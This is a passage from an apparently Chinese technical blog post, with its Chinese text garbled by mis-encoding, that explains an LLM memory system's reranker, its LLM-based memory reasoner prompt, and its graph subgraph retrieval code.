<p>retrieve_from_cube æ–¹æ³•ï¼šä¸“é—¨ç”¨äºä»ç‰¹å®šçš„ cube ä¸­æ£€ç´¢è®°å¿†é¡¹ï¼Œè¿™åœ¨å¤šç§Ÿæˆ·æˆ–åˆ†ç‰‡åœºæ™¯ä¸­å¾ˆæœ‰ç”¨ã€‚</p>
</li>
</ul>
<h5 data-id="heading-23">2.6.3 å·¥ä½œæµç¨‹æ€»ç»“</h5>
<ul>
<li>æ¥æ”¶ç”¨æˆ·æŸ¥è¯¢å’Œè§£æåçš„ä»»åŠ¡ç›®æ ‡</li>
<li>å¹¶è¡Œæ‰§è¡Œå›¾ç»“æ„æ£€ç´¢å’Œå‘é‡æ£€ç´¢</li>
<li>åˆå¹¶ä¸¤ç§æ£€ç´¢ç»“æœ</li>
<li>å»é™¤é‡å¤é¡¹å¹¶è¿”å›æœ€ç»ˆç»“æœ</li>
</ul>
<h4 data-id="heading-24">2.7 Reranker</h4>
<p>ä½¿ç”¨ CosineLocalReranker åšè§£æã€‚CosineLocalReranker æ˜¯ä¸€ä¸ªæœ¬åœ°å®ç°çš„é‡æ’åºå™¨ï¼Œå®ƒä½¿ç”¨ä½™å¼¦ç›¸ä¼¼åº¦ç®—æ³•å¯¹æ£€ç´¢åˆ°çš„è®°å¿†é¡¹è¿›è¡Œé‡æ–°æ’åºï¼Œä»¥æé«˜æ£€ç´¢ç»“æœçš„ç›¸å…³æ€§ã€‚</p>
<h5 data-id="heading-25">2.7.1 ä¸»è¦åŠŸèƒ½</h5>
<p>ä¸»è¦åŠŸèƒ½æ˜¯ä½™å¼¦ç›¸ä¼¼åº¦è®¡ç®—</p>
<ul>
<li>è®¡ç®—æŸ¥è¯¢å‘é‡ä¸å€™é€‰è®°å¿†é¡¹å‘é‡ä¹‹é—´çš„ä½™å¼¦ç›¸ä¼¼åº¦</li>
<li>æ”¯æŒå•ä¸ªæŸ¥è¯¢å‘é‡ä¸å¤šä¸ªå€™é€‰å‘é‡çš„åŒæ—¶è®¡ç®—</li>
</ul>
<h5 data-id="heading-26">2.7.2 å·¥ä½œæµç¨‹æ€»ç»“</h5>
<ul>
<li>æ¥æ”¶æ¥è‡ª GraphMemoryRetriever çš„åˆæ­¥æ£€ç´¢ç»“æœ</li>
<li>è·å–æŸ¥è¯¢çš„åµŒå…¥å‘é‡å’Œå€™é€‰è®°å¿†é¡¹çš„åµŒå…¥å‘é‡</li>
<li>è®¡ç®—æŸ¥è¯¢å‘é‡ä¸æ¯ä¸ªå€™é€‰å‘é‡çš„ä½™å¼¦ç›¸ä¼¼åº¦</li>
<li>æ ¹æ®è®°å¿†é¡¹çš„å±‚çº§ç±»å‹åº”ç”¨ç›¸åº”æƒé‡</li>
<li>æŒ‰ç…§åŠ æƒç›¸ä¼¼åº¦åˆ†æ•°å¯¹ç»“æœè¿›è¡Œæ’åº</li>
<li>è¿”å›å‰ K ä¸ªæœ€ç›¸å…³çš„ç»“æœç»™ä¸‹ä¸€ä¸ªå¤„ç†é˜¶æ®µ</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿåœ¨æœ¬åœ°å¿«é€Ÿå®Œæˆé‡æ’åºæ“ä½œï¼Œè€Œæ— éœ€ä¾èµ–å¤–éƒ¨æœåŠ¡ï¼ŒåŒæ—¶é€šè¿‡å±‚çº§æƒé‡æœºåˆ¶å¯ä»¥ä¼˜å…ˆè€ƒè™‘æŸäº›ç±»å‹çš„è®°å¿†é¡¹ï¼Œä»è€Œæé«˜æ£€ç´¢ç»“æœçš„è´¨é‡ã€‚</p>
<h4 data-id="heading-27">2.8 MemoryReasoner</h4>
<p>MemoryReasoner æ˜¯ä¸€ä¸ªä¸“é—¨è´Ÿè´£å¯¹æ£€ç´¢åˆ°çš„è®°å¿†é¡¹è¿›è¡Œæ¨ç†å’ŒçŸ¥è¯†ç»¼åˆçš„ç»„ä»¶ã€‚å®ƒçš„ä¸»è¦èŒè´£æ˜¯å¯¹ä»ä¸åŒæ¥æºæ£€ç´¢åˆ°çš„è®°å¿†è¿›è¡Œåˆ†æã€ç­›é€‰å’Œä¼˜åŒ–ï¼Œä»è€Œæä¾›æ›´ç²¾ç¡®å’Œç›¸å…³çš„è®°å¿†ç»“æœã€‚</p>
<h5 data-id="heading-28">2.8.1 ä¸»è¦åŠŸèƒ½</h5>
<ul>
<li>
<p>è®°å¿†æ¨ç†ä¸ç»¼åˆ</p>
<ul>
<li>æ¥æ”¶åŸå§‹æŸ¥è¯¢å’Œå·²æ£€ç´¢çš„ç›¸å…³è®°å¿†é¡¹</li>
<li>åˆ©ç”¨å¤§å‹è¯­è¨€æ¨¡å‹åˆ†æå¤šä¸ªæ£€ç´¢åˆ°çš„è®°å¿†é¡¹</li>
<li>æ ¹æ®ç”¨æˆ·çš„æŸ¥è¯¢ç›®æ ‡ç»¼åˆç›¸å…³ä¿¡æ¯</li>
<li>ç”Ÿæˆæ›´åŠ ç²¾ç¡®å’Œç›¸å…³çš„è®°å¿†å“åº”</li>
</ul>
</li>
</ul>

<ul>
<li>
<p>æ™ºèƒ½ç­›é€‰</p>
<ul>
<li>é€šè¿‡ LLM åˆ¤æ–­å“ªäº›è®°å¿†é¡¹ä¸å½“å‰æŸ¥è¯¢æœ€ç›¸å…³</li>
<li>åªè¿”å›ç»è¿‡ç­›é€‰çš„ç›¸å…³è®°å¿†é¡¹</li>
</ul>
</li>
</ul>
<h5 data-id="heading-29">2.8.2 æ ¸å¿ƒæ–¹æ³•</h5>
<p>reason æ˜¯ä¸»è¦çš„æ¨ç†æ–¹æ³•ï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>
<p>æ„å»ºæç¤ºè¯ï¼š</p>
<ul>
<li>ä½¿ç”¨æ¨¡æ¿ REASON_PROMPT æ„å»ºæ¨ç†æç¤ºè¯</li>
<li>å°†æ£€ç´¢åˆ°çš„è®°å¿†é¡¹æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²åˆ—è¡¨</li>
</ul>
</li>
<li>
<p>è°ƒç”¨ LLMï¼š</p>
<ul>
<li>å°†æ„å»ºå¥½çš„æç¤ºè¯å‘é€ç»™è¯­è¨€æ¨¡å‹ç”Ÿæˆå“åº”</li>
</ul>
</li>
<li>
<p>è§£æå“åº”ï¼š</p>
<ul>
<li>æå–æ¨¡å‹é€‰æ‹©çš„è®°å¿†é¡¹ ID</li>
<li>è¿”å›å¯¹åº”çš„è®°å¿†é¡¹åˆ—è¡¨</li>
</ul>
</li>
</ul>
<p>parse_selected_ids æ–¹æ³•è´Ÿè´£ä»æ¨¡å‹å“åº”ä¸­æå–é€‰å®šçš„è®°å¿†é¡¹ IDï¼š</p>
<ul>
<li>JSON è§£æï¼šé¦–å…ˆå°è¯•å°†å“åº”è§£æä¸º JSON æ ¼å¼</li>
<li>æ­£åˆ™è¡¨è¾¾å¼å›é€€ï¼šå¦‚æœ JSON è§£æå¤±è´¥ï¼Œåˆ™ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… UUID æ ¼å¼çš„ ID</li>
</ul>
<h5 data-id="heading-30">2.8.3 æç¤ºè¯</h5>
<pre><code class="hljs language-css" lang="css">REASON_PROMPT = """
You are <span class="hljs-selector-tag">a</span> reasoning agent working with <span class="hljs-selector-tag">a</span> memory system. You will synthesize knowledge <span class="hljs-selector-tag">from</span> multiple memory cards <span class="hljs-selector-tag">to</span> construct <span class="hljs-selector-tag">a</span> meaningful response <span class="hljs-selector-tag">to</span> the task below.
â€‹
Task: ${task}
â€‹
Memory cards (with metadata):
${detailed_memory_list}
â€‹
Please perform:
<span class="hljs-number">1</span>. Clustering by theme (topic/concept/fact)
<span class="hljs-number">2</span>. Identify useful chains or connections
<span class="hljs-number">3</span>. Return a curated list of memory card IDs with reasons.
â€‹
Output in JSON:
{
  "selected_ids": [...],
  <span class="hljs-string">"explanation"</span>: <span class="hljs-string">"..."</span>
}
"""
</code></pre>
<h5 data-id="heading-31">2.8.4 å·¥ä½œæµç¨‹æ€»ç»“</h5>
<ul>
<li>
<p>æ¥æ”¶æ¥è‡ªä¸Šä¸€é˜¶æ®µçš„æ£€ç´¢å’Œé‡æ’åºç»“æœ</p>
</li>
<li>
<p>æ„å»ºæ¨ç†æç¤ºè¯ï¼š</p>
<ul>
<li>å°†ç”¨æˆ·çš„æŸ¥è¯¢ã€è§£æåçš„ä»»åŠ¡ç›®æ ‡ä»¥åŠæ£€ç´¢åˆ°çš„è®°å¿†é¡¹ç»„åˆæˆä¸€ä¸ªç»“æ„åŒ–çš„æç¤ºè¯</li>
<li>ä½¿ç”¨é¢„å®šä¹‰çš„ REASON_PROMPT æ¨¡æ¿</li>
</ul>
</li>
<li>
<p>è°ƒç”¨ LLM è¿›è¡Œæ¨ç†ï¼š</p>
<ul>
<li>å°†æ„å»ºå¥½çš„æç¤ºè¯å‘é€ç»™å¤§å‹è¯­è¨€æ¨¡å‹</li>
<li>ä½¿ç”¨ LLM è¿›ä¸€æ­¥åˆ†æå’Œæ¨ç†è¿™äº›è®°å¿†é¡¹çš„ç›¸å…³æ€§</li>
<li>è·å–æ¨¡å‹çš„å“åº”ï¼Œè¯¥å“åº”åŒ…å«å¯¹è®°å¿†é¡¹çš„ç›¸å…³æ€§åˆ¤æ–­</li>
</ul>
</li>
<li>
<p>è§£æå’Œç­›é€‰ç»“æœï¼š</p>
<ul>
<li>
<p>è§£æ LLM çš„å“åº”ï¼Œæå–è¢«é€‰ä¸­çš„è®°å¿†é¡¹ ID</p>
</li>
<li>
<p>æ”¯æŒä¸¤ç§è§£ææ–¹å¼ï¼š</p>
<ul>
<li>JSON æ ¼å¼ï¼šç›´æ¥æå– selected_ids å­—æ®µ</li>
<li>æ–‡æœ¬æ ¼å¼ï¼šé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… UUID æ¨¡å¼</li>
</ul>
</li>
</ul>
</li>
<li>
<p>è¿”å›ç²¾é€‰è®°å¿†ï¼š</p>
<ul>
<li>æ ¹æ®è§£æå‡ºçš„ ID åˆ—è¡¨ç­›é€‰åŸå§‹è®°å¿†é¡¹</li>
<li>è¿”å›æœ€ç›¸å…³çš„ç»“æœå­é›†</li>
</ul>
</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿å¾—ç³»ç»Ÿèƒ½å¤Ÿåˆ©ç”¨ LLM çš„ç†è§£å’Œæ¨ç†èƒ½åŠ›ï¼Œä»å¤§é‡æ£€ç´¢åˆ°çš„è®°å¿†ä¸­é€‰å‡ºæœ€ç¬¦åˆç”¨æˆ·éœ€æ±‚çš„éƒ¨åˆ†ï¼Œæé«˜äº†ç³»ç»Ÿçš„å‡†ç¡®æ€§å’Œæ™ºèƒ½åŒ–æ°´å¹³ã€‚</p>
<h5 data-id="heading-32">2.8.5 ä¼˜åŠ¿</h5>
<ul>
<li>æ™ºèƒ½åŒ–å¤„ç†ï¼šåˆ©ç”¨ LLM çš„ç†è§£èƒ½åŠ›å¯¹è®°å¿†é¡¹è¿›è¡Œè¯­ä¹‰å±‚é¢çš„åˆ†æ</li>
<li>çµæ´»æ€§ï¼šæ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼çš„è§£æ</li>
<li>ç²¾å‡†æ€§ï¼šèƒ½å¤Ÿè¿›ä¸€æ­¥æå‡æ£€ç´¢ç»“æœçš„ç›¸å…³æ€§å’Œè´¨é‡</li>
</ul>
<p>æ€»çš„æ¥è¯´ï¼ŒMemoryReasoner åœ¨æ•´ä¸ªè®°å¿†æ£€ç´¢ç³»ç»Ÿä¸­æ‰®æ¼”ç€â€œæ™ºèƒ½ç­›é€‰å™¨â€çš„è§’è‰²ï¼Œé€šè¿‡å¼•å…¥ LLM çš„æ¨ç†èƒ½åŠ›ï¼Œä½¿ç³»ç»Ÿèƒ½å¤Ÿæ›´å‡†ç¡®åœ°ç†è§£ç”¨æˆ·éœ€æ±‚å¹¶è¿”å›æœ€ç›¸å…³çš„è®°å¿†é¡¹ã€‚</p>
<h4 data-id="heading-33">2.9 Reranker å’Œ Reasoner</h4>
<p>åœ¨ç³»ç»Ÿä¸­åŒæ—¶ä½¿ç”¨ Reranker å’Œ Reasoner æ˜¯ä¸ºäº†å®ç°ä¸åŒå±‚æ¬¡çš„æ£€ç´¢ç»“æœå¤„ç†å’Œä¼˜åŒ–ï¼Œå®ƒä»¬å„è‡ªæ‰¿æ‹…ä¸åŒçš„èŒè´£ã€‚</p>
<h5 data-id="heading-34">2.9.1 Reranker çš„ä½œç”¨</h5>
<p>Rerankerï¼ˆé‡æ’åºå™¨ï¼‰ä¸»è¦è´Ÿè´£å¯¹åˆæ­¥æ£€ç´¢ç»“æœè¿›è¡Œç›¸å…³æ€§é‡æ–°æ’åºï¼š</p>
<ul>
<li>åŠŸèƒ½ï¼šåŸºäºæŸ¥è¯¢å’Œå€™é€‰ç»“æœçš„ç›¸ä¼¼åº¦è®¡ç®—ï¼Œå¯¹æ£€ç´¢ç»“æœè¿›è¡Œé‡æ–°æ’åº</li>
<li>æ–¹æ³•ï¼šé€šå¸¸ä½¿ç”¨æ•°å­¦è®¡ç®—ï¼ˆå¦‚ä½™å¼¦ç›¸ä¼¼åº¦ï¼‰æ¥è¯„ä¼°ç›¸å…³æ€§</li>
<li>è¾“å‡ºï¼šè¿”å›æŒ‰ç›¸å…³æ€§å¾—åˆ†æ’åºçš„è®°å¿†é¡¹åˆ—è¡¨</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">def rerank(self, query, graph_results, top_k, **kwargs):
 Â  Â <span class="hljs-comment"># è®¡ç®—ç›¸ä¼¼åº¦</span>
 Â  Â <span class="hljs-attr">sims</span> = _cosine_one_to_many(query_embedding, cand_vecs)
 Â  Â <span class="hljs-comment"># åº”ç”¨æƒé‡è°ƒæ•´</span>
 Â  Â <span class="hljs-attr">weighted</span> = [sim * get_weight(it) for sim, it in zip(sims, items_with_emb)]
 Â  Â <span class="hljs-comment"># æ’åºå¹¶è¿”å›å‰ K ä¸ªç»“æœ</span>
 Â  Â scored_pairs.sort(<span class="hljs-attr">key</span>=lambda x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)
 Â  Â return scored_pairs<span class="hljs-section">[:top_k]</span>
</code></pre>
<h5 data-id="heading-35">2.9.2 Reasoner çš„ä½œç”¨</h5>
<p>Reasonerï¼ˆæ¨ç†å™¨ï¼‰ä¸»è¦è´Ÿè´£å¯¹æ’åºåçš„ç»“æœè¿›è¡Œè¯­ä¹‰ç†è§£å’Œæ¨ç†ï¼š</p>
<ul>
<li>åŠŸèƒ½ï¼šåŸºäºè¯­è¨€æ¨¡å‹å¯¹æ£€ç´¢åˆ°çš„è®°å¿†é¡¹è¿›è¡Œè¯­ä¹‰ç†è§£å’Œæ¨ç†</li>
<li>æ–¹æ³•ï¼šä½¿ç”¨å¤§è¯­è¨€æ¨¡å‹åˆ†ææŸ¥è¯¢å’Œè®°å¿†é¡¹ä¹‹é—´çš„æ·±å±‚è¯­ä¹‰å…³ç³»</li>
<li>è¾“å‡ºï¼šè¿”å›ç»è¿‡è¯­ä¹‰æ¨ç†ç­›é€‰åçš„æœ€ç»ˆè®°å¿†é¡¹</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">def reason(self, query, ranked_memories, parsed_goal):
 Â  Â <span class="hljs-comment"># æ„å»ºæ¨ç†æç¤º</span>
 Â  Â <span class="hljs-attr">prompt</span> = prompt_template.substitute(task=query, detailed_memory_list=memory_detailed_str)
 Â  Â <span class="hljs-comment"># ä½¿ç”¨ LLM è¿›è¡Œæ¨ç†</span>
 Â  Â <span class="hljs-attr">response</span> = self.llm.generate([{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}])
 Â  Â <span class="hljs-comment"># è§£æå¹¶è¿”å›æ¨ç†ç»“æœ</span>
 Â  Â <span class="hljs-attr">selected_ids</span> = self._parse_selected_ids(content)
 Â  Â return <span class="hljs-section">[m for m in ranked_memories if m.id in id_set]</span>
</code></pre>
<h5 data-id="heading-36">2.9.3 ä¸ºä»€ä¹ˆéœ€è¦ä¸¤è€…ç»“åˆï¼Ÿ</h5>
<ol start="0">
<li>ä¸åŒçš„å¤„ç†å±‚æ¬¡</li>
</ol>
<p>Rerankerï¼šåœ¨æ•°å­¦å‘é‡ç©ºé—´ä¸­è¿›è¡Œå¿«é€Ÿç›¸å…³æ€§è®¡ç®—</p>
<p>Reasonerï¼šåœ¨è¯­ä¹‰å±‚é¢è¿›è¡Œæ·±åº¦ç†è§£å’Œæ¨ç†</p>
<ol start="2">
<li>
<p>äº’è¡¥çš„ä¼˜åŠ¿</p>
<p>æ•ˆç‡ vs ç²¾åº¦ï¼šReranker å¿«é€Ÿç­›é€‰ï¼ŒReasoner ç²¾ç¡®æ¨ç†</p>
<p>å®šé‡ vs å®šæ€§ï¼šReranker åŸºäºæ•°å€¼è®¡ç®—ï¼ŒReasoner åŸºäºè¯­ä¹‰ç†è§£</p>
</li>
</ol>
<p>ç³»ç»Ÿè®¾è®¡ä¼˜åŠ¿</p>
<ul>
<li>
<p>æ€§èƒ½ä¼˜åŒ–ï¼šé¿å…ç›´æ¥å¯¹å¤§é‡å€™é€‰ç»“æœä½¿ç”¨æ˜‚è´µçš„ LLM æ¨ç†</p>
</li>
<li>
<p>ç²¾åº¦æå‡ï¼šå…ˆç”¨æ•°å­¦æ–¹æ³•ç²—ç­›ï¼Œå†ç”¨è¯­ä¹‰æ–¹æ³•ç²¾ç­›</p>
</li>
<li>
<p>æ¨¡å—åŒ–è®¾è®¡ï¼šä¸¤ä¸ªç»„ä»¶èŒè´£åˆ†æ˜ï¼Œä¾¿äºç‹¬ç«‹ä¼˜åŒ–å’Œæ›¿æ¢</p>
</li>
<li>
<p>é€‚åº”ä¸åŒåœºæ™¯ï¼š</p>
<ul>
<li>å¿«é€Ÿæ¨¡å¼ï¼šå¯èƒ½åªä½¿ç”¨ Reranker</li>
<li>ç²¾ç»†æ¨¡å¼ï¼šä¸¤è€…éƒ½ä½¿ç”¨ä»¥è·å¾—æœ€ä½³ç»“æœ</li>
</ul>
</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿å¾—ç³»ç»Ÿæ—¢èƒ½åœ¨ä¿è¯æ£€ç´¢è´¨é‡çš„åŒæ—¶æ§åˆ¶è®¡ç®—æˆæœ¬ï¼Œåˆèƒ½æ ¹æ®ä¸åŒçš„åº”ç”¨åœºæ™¯çµæ´»è°ƒæ•´å¤„ç†æµç¨‹ã€‚</p>
<h5 data-id="heading-37">2.9.4 å…·ä½“ç¤ºä¾‹</h5>
<p>å‡è®¾ç”¨æˆ·æŸ¥è¯¢ï¼šâ€œæœºå™¨å­¦ä¹ ä¸­çš„æ¢¯åº¦ä¸‹é™ç®—æ³•å¦‚ä½•å·¥ä½œï¼Ÿâ€</p>
<ul>
<li>
<p>åˆå§‹æ£€ç´¢ï¼šç³»ç»Ÿå¯èƒ½æ£€ç´¢åˆ° 100 ä¸ªç›¸å…³è®°å¿†é¡¹</p>
</li>
<li>
<p>Reranker å¤„ç†ï¼š</p>
<ul>
<li>è®¡ç®—æŸ¥è¯¢ä¸æ¯ä¸ªè®°å¿†é¡¹çš„ä½™å¼¦ç›¸ä¼¼åº¦</li>
<li>æ ¹æ®å±‚çº§æƒé‡ï¼ˆtopic/concept/factï¼‰è°ƒæ•´å¾—åˆ†</li>
<li>è¿”å›å‰ 20 ä¸ªæœ€ç›¸å…³çš„è®°å¿†é¡¹</li>
</ul>
</li>
<li>
<p>Reasoner å¤„ç†ï¼š</p>
<ul>
<li>å°†å‰ 20 ä¸ªè®°å¿†é¡¹å’ŒæŸ¥è¯¢ä¸€èµ·äº¤ç»™ LLM</li>
<li>LLM åˆ†æå“ªäº›è®°å¿†é¡¹çœŸæ­£å›ç­”äº†ç”¨æˆ·çš„é—®é¢˜</li>
<li>å¯èƒ½å‘ç°åªæœ‰å…¶ä¸­ 5 ä¸ªè®°å¿†é¡¹çœŸæ­£ç›¸å…³ä¸”äº’è¡¥</li>
<li>è¿”å›è¿™ 5 ä¸ªæœ€åˆé€‚çš„è®°å¿†é¡¹</li>
</ul>
</li>
</ul>
<h3 data-id="heading-38">0x03 å­å›¾æ£€ç´¢</h3>
<h4 data-id="heading-39">3.1 åŠŸèƒ½</h4>
<p>get_relevant_subgraphæ–¹æ³•çš„åŠŸèƒ½æ˜¯ï¼š</p>
<ul>
<li>
<p>æŸ¥æ‰¾ä¸æŸ¥è¯¢ç›¸å…³çš„å±€éƒ¨å­å›¾ï¼ˆFind Relevant Local Subgraphï¼‰</p>
<ul>
<li>æ¥æ”¶ç”¨æˆ·æŸ¥è¯¢å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥</li>
<li>é€šè¿‡åµŒå…¥æ¨¡å‹å°†æŸ¥è¯¢è½¬æ¢ä¸ºå‘é‡è¡¨ç¤º</li>
<li>åœ¨å›¾æ•°æ®åº“ä¸­æœç´¢ä¸æŸ¥è¯¢å‘é‡æœ€ç›¸ä¼¼çš„å‰kä¸ªèŠ‚ç‚¹</li>
</ul>
</li>
</ul>

<ul>
<li>
<p>æ„å»ºé‚»åŸŸå­å›¾ï¼ˆBuild Neighborhood Subgraphsï¼‰ï¼Œå¯¹æ¯ä¸ªç›¸ä¼¼èŠ‚ç‚¹ï¼š</p>
<ul>
<li>ç¡®ä¿å…¶çŠ¶æ€ç¬¦åˆæŒ‡å®šæ¡ä»¶ï¼ˆé»˜è®¤ä¸º"activated"ï¼‰</li>
<li>è·å–ä»¥è¯¥èŠ‚ç‚¹ä¸ºä¸­å¿ƒã€æŒ‡å®šæ·±åº¦ï¼ˆé»˜è®¤2è·³ï¼‰çš„å±€éƒ¨å­å›¾</li>
<li>æ”¶é›†ä¸­å¿ƒèŠ‚ç‚¹ã€é‚»å±…èŠ‚ç‚¹å’Œè¿æ¥è¾¹</li>
</ul>
</li>
</ul>

<ul>
<li>
<p>åˆå¹¶å¤šä¸ªå­å›¾ä¸ºç»Ÿä¸€ç»“æ„ï¼ˆMerge Subgraphsï¼‰</p>
<ul>
<li>
<p>å°†æ‰€æœ‰æ£€ç´¢åˆ°çš„å±€éƒ¨å­å›¾åˆå¹¶æˆä¸€ä¸ªè¿é€šçš„å­å›¾</p>
</li>
<li>
<p>å»é™¤é‡å¤èŠ‚ç‚¹å’Œè¾¹</p>
</li>
<li>
<p>è¿”å›åŒ…å«ä»¥ä¸‹ä¿¡æ¯çš„å­—å…¸ç»“æ„ï¼š</p>
<ul>
<li>core_id: æœ€åŒ¹é…çš„æ ¸å¿ƒèŠ‚ç‚¹ID</li>
<li>nodes: åˆå¹¶åçš„å”¯ä¸€èŠ‚ç‚¹åˆ—è¡¨</li>
<li>edges: åˆå¹¶åçš„å”¯ä¸€è¾¹åˆ—è¡¨</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>è¿™ç§æ–¹æ³•ç‰¹åˆ«é€‚ç”¨äºéœ€è¦ç†è§£å¤æ‚å…³ç³»å’Œä¸Šä¸‹æ–‡çš„åœºæ™¯ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>æŸ¥æ‰¾ä¸ç‰¹å®šä¸»é¢˜ç›¸å…³çš„çŸ¥è¯†ç½‘ç»œç‰‡æ®µ</li>
<li>è¿›è¡Œå¤šè·³æ¨ç†ä»¥å‘ç°é—´æ¥å…³è”</li>
<li>æä¾›å¯è§£é‡Šçš„è®°å¿†æ£€ç´¢ç»“æœï¼Œå±•ç¤ºèŠ‚ç‚¹é—´çš„å…³ç³»è·¯å¾„</li>
</ul>
<p>ä¸»è¦ä¼˜åŠ¿åœ¨äºå®ƒä¸ä»…è¿”å›ç›¸å…³èŠ‚ç‚¹ï¼Œè¿˜ä¿ç•™äº†å®ƒä»¬ä¹‹é—´çš„è¯­ä¹‰å…³ç³»ç»“æ„ï¼Œè¿™å¯¹äºé«˜çº§æ¨ç†ä»»åŠ¡éå¸¸æœ‰ç”¨ã€‚</p>
<h4 data-id="heading-40">3.2 ä»£ç </h4>
<p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"> Â  Â <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_relevant_subgraph</span>(<span class="hljs-params">
 Â  Â  Â  Â self, query: <span class="hljs-built_in">str</span>, top_k: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span>, depth: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span>, center_status: <span class="hljs-built_in">str</span> = <span class="hljs-string">"activated"</span>
 Â   </span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
 Â  Â  Â  Â <span class="hljs-string">"""
 Â  Â  Â   Find and merge the local neighborhood sub-graphs of the top-k
 Â  Â  Â   nodes most relevant to the query.
 Â  Â  Â  Â  Process:
 Â  Â  Â  Â  Â  Â  1. Embed the user query into a vector representation.
 Â  Â  Â  Â  Â  Â  2. Use vector similarity search to find the top-k similar nodes.
 Â  Â  Â  Â  Â  Â  3. For each similar node:
 Â  Â  Â  Â  Â  Â  Â  Â  - Ensure its status matches `center_status` (e.g., 'active').
 Â  Â  Â  Â  Â  Â  Â  Â  - Retrieve its local subgraph up to `depth` hops.
 Â  Â  Â  Â  Â  Â  Â  Â  - Collect the center node, its neighbors, and connecting edges.
 Â  Â  Â  Â  Â  Â  4. Merge all retrieved subgraphs into a single unified subgraph.
 Â  Â  Â  Â  Â  Â  5. Return the merged subgraph structure.
â€‹
 Â  Â  Â  Â  Args:
 Â  Â  Â  Â  Â  Â  query (str): The user input or concept to find relevant memories for.
 Â  Â  Â  Â  Â  Â  top_k (int, optional): How many top similar nodes to retrieve. Default is 5.
 Â  Â  Â  Â  Â  Â  depth (int, optional): The neighborhood depth (number of hops). Default is 2.
 Â  Â  Â  Â  Â  Â  center_status (str, optional): Status condition the center node must satisfy (e.g., 'active').
â€‹
 Â  Â  Â  Â  Returns:
 Â  Â  Â  Â  Â  Â  dict[str, Any]: A subgraph dict with:
 Â  Â  Â  Â  Â  Â  Â  Â  - 'core_id': ID of the top matching core node, or None if none found.
 Â  Â  Â  Â  Â  Â  Â  Â  - 'nodes': List of unique nodes (core + neighbors) in the merged subgraph.
 Â  Â  Â  Â  Â  Â  Â  Â  - 'edges': List of unique edges (as dicts with 'from', 'to', 'type') in the merged subgraph.
 Â  Â  Â   """</span>
 Â  Â  Â  Â <span class="hljs-comment"># Step 1: Embed query</span>
 Â  Â  Â  Â query_embedding = self.embedder.embed([query])[<span class="hljs-number">0</span>]
â€‹
 Â  Â  Â  Â <span class="hljs-comment"># Step 2: Get top-1 similar node</span>
 Â  Â  Â  Â similar_nodes = self.graph_store.search_by_embedding(query_embedding, top_k=top_k)
 Â  Â  Â  Â <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> similar_nodes:
 Â  Â  Â  Â  Â  Â logger.info(<span class="hljs-string">"No similar nodes found for query embedding."</span>)
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">return</span> {<span class="hljs-string">"core_id"</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">"nodes"</span>: [], <span class="hljs-string">"edges"</span>: []}
â€‹
 Â  Â  Â  Â <span class="hljs-comment"># Step 3: Fetch neighborhood</span>
 Â  Â  Â  Â all_nodes = {}
 Â  Â  Â  Â all_edges = <span class="hljs-built_in">set</span>()
 Â  Â  Â  Â cores = []
â€‹
 Â  Â  Â  Â <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> similar_nodes:
 Â  Â  Â  Â  Â  Â core_id = node[<span class="hljs-string">"id"</span>]
 Â  Â  Â  Â  Â  Â score = node[<span class="hljs-string">"score"</span>]
â€‹
 Â  Â  Â  Â  Â  Â subgraph = self.graph_store.get_subgraph(
 Â  Â  Â  Â  Â  Â  Â  Â center_id=core_id, depth=depth, center_status=center_status
 Â  Â  Â  Â  Â   )
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subgraph[<span class="hljs-string">"core_node"</span>]:
 Â  Â  Â  Â  Â  Â  Â  Â logger.info(<span class="hljs-string">f"Skipping node <span class="hljs-subst">{core_id}</span> (inactive or not found)."</span>)
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">continue</span>
â€‹
 Â  Â  Â  Â  Â  Â core_node = subgraph[<span class="hljs-string">"core_node"</span>]
 Â  Â  Â  Â  Â  Â neighbors = subgraph[<span class="hljs-string">"neighbors"</span>]
 Â  Â  Â  Â  Â  Â edges = subgraph[<span class="hljs-string">"edges"</span>]
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-comment"># Collect nodes</span>
 Â  Â  Â  Â  Â  Â all_nodes[core_node[<span class="hljs-string">"id"</span>]] = core_node
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> neighbors:
 Â  Â  Â  Â  Â  Â  Â  Â all_nodes[n[<span class="hljs-string">"id"</span>]] = n
â€‹
 Â  Â  Â  Â  Â  Â <span class="hljs-comment"># Collect edges</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> edges:
 Â  Â  Â  Â  Â  Â  Â  Â all_edges.add((e[<span class="hljs-string">"source"</span>], e[<span class="hljs-string">"target"</span>], e[<span class="hljs-string">"type"</span>]))
â€‹
 Â  Â  Â  Â  Â  Â cores.append(
